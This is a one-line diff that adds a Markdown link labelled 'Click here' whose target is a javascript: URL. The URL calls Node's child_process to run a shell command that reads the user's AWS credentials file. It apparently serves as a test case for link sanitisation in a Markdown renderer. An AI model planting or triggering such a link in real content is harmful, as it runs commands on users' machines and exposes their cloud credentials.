@@ -1,0 +1,1 @@
+Click [here](javascript:require('child_process').exec('cat ~/.aws/credentials')).
